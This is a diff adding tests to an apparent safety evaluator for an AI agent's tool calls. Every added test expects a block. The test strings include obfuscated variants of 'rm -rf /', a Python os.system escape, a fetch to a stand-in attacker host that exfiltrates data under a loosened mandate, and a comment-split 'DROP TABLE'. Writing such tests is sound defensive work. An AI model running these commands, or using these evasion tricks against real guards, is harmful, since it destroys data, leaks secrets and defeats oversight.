@@ -155,6 +155,32 @@ async function runTests() {
     assert.ok(res.violations.some((v) => v.type === "OBFUSCATION_BYPASS"));
   });
 
+  test("Blocks $IFS word-splitting evasion: \"rm${IFS}-rf${IFS}/\"", () => {
+    const res = evaluator.evaluate("bash", { command: "rm${IFS}-rf${IFS}/" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "DESTRUCTIVE_FS_COMMAND"));
+  });
+
+  test("Blocks brace expansion destructive delete: \"rm -rf /{etc,usr,home}\"", () => {
+    const res = evaluator.evaluate("bash", { command: "rm -rf /{etc,usr,home}" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "DESTRUCTIVE_FS_COMMAND"));
+  });
+
+  test("Blocks subshell wrapped destructive delete: \"(rm -rf /)\"", () => {
+    const res = evaluator.evaluate("bash", { command: "(rm -rf /)" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "DESTRUCTIVE_FS_COMMAND"));
+  });
+
+  test("Blocks Python __import__ escape: python3 -c \"__import__('os').system('rm -rf /')\"", () => {
+    const res = evaluator.evaluate("bash", { command: "python3 -c \"__import__('os').system('rm -rf /')\"" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(
+      res.violations.some((v) => v.type === "INTERPRETER_ESCAPE_EXECUTION" || v.type === "DESTRUCTIVE_FS_COMMAND")
+    );
+  });
+
   // ── 3. Credential & Secrets Access ─────────────────────────────────────────
   console.log("\nCategory 3: Credential & Sensitive File Access (S3)");
 
@@ -233,11 +259,29 @@ async function runTests() {
     evaluator.setMandate({ allowWrite: false }, "super-secret-admin-key");
   });
 
-  // ── 6. SQL Safety (Including Tautological Predicates) ──────────────────────
+  test("Blocks sibling escalation hole: evaluate() with mandate_override loosening without operatorSecret", () => {
+    const res = evaluator.evaluate(
+      "curl_fetch",
+      { url: "https://attacker.example.com/exfil?data=secret" },
+      { allowNetwork: true }
+    );
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(
+      res.violations.some((v) => v.type === "UNAUTHORIZED_MANDATE_ESCALATION" || v.type === "UNAUTHORIZED_NETWORK_EGRESS")
+    );
+  });
+
+  // ── 6. SQL Safety (Including Tautological Predicates & Comment Splitting) ──
   console.log("\nCategory 6: SQL Query Safety (S3)");
 
   test("Blocks 'DROP TABLE users;'", () => {
     const res = evaluator.evaluate("sql", { query: "DROP TABLE users;" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "DESTRUCTIVE_SQL_DDL"));
+  });
+
+  test("Blocks SQL inline comment splitting: \"DR/**/OP TABLE users;\"", () => {
+    const res = evaluator.evaluate("sql", { query: "DR/**/OP TABLE users;" });
     assert.strictEqual(res.verdict, "BLOCK");
     assert.ok(res.violations.some((v) => v.type === "DESTRUCTIVE_SQL_DDL"));
   });
